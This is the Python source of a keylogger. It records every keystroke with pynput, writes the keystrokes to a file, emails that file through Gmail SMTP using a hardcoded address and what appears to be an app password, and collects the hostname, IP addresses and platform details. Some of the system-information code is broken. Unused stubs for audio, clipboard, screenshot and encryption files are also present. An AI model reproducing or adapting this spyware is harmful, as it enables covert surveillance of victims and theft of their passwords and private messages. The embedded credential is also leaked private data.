# Libraries
from pynput.keyboard import Key, Listener

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import os

import socket
import platform

from requests import get

# Extensions
keys_info = 'key_log.txt'
system_info = 'system.txt'
audio_info = 'audio.wav'
clipboard_info = 'clipboard.txt'
screenshot_info = 'screenshot.png'


# Encryption files
system_info_e = 'e_system.txt'
clipboard_info_e = 'e_clipboard.txt'
keys_info_e = 'e_key_log.txt'


# Logging Keys
keys = []
count = 0

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []
    
def write_file(keys):
    with open(keys_info, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            if k.find("enter") > 0:
                f.write('\n')
            if k.find("shift") > 0:
                f.write('')
            if k.find("tab") > 0:
                f.write('   ')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Sending email
def send_email(fromaddr, password, toaddr, filename=keys_info):
    try:    
        # Create Message container
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Keylogger Data"

        # Email body
        body = "Attached is the latest keystroke log"
        msg.attach(MIMEText(body, 'plain'))

        # Attaches log file
        if os.path.exists(filename):
            with open(filename, "rb") as attachment:
                p = MIMEBase('application', 'octet-stream')
                p.set_payload((attachment).read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
                msg.attach(p)
        else:
            msg.attach(MIMEText("Log file not found.", 'plain'))

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as s:
            s.login(fromaddr, password)
            s.sendmail(fromaddr, toaddr, msg.as_string())
            print("Email sent successfully")
    
    except Exception as e:
        print(f"Failed to send email: {e}")

send_email("francopanko6@gmail.com", "wucm qbdz kwlx puop", "francopanko6@gmail.com")

# Gathering computer information

def get_computer_info():
    if os.path.exists(system_info):
        with open(system_info, 'a') as f:
            info = ""
            info += f"Hostname: {socket.gethostname()}\n"
            info += f"Private IP Address: {socket.gethostname(socket.gethostname())}\n"
            try:
                public_ip = get("https://api.ipify.org").text
                info += f"Public IP Address: {public_ip}\n"
            except:
                info += f"Could not retireve Public IP Address (most likely max query)\n"
            info += f"Processor: {platform.processor}\n"
            info += f"System: {platform.system} Version: {platform.version}\n"
            info += f"Machine: {platform.machine}\n"
            f.write(info)

get_computer_info()

            


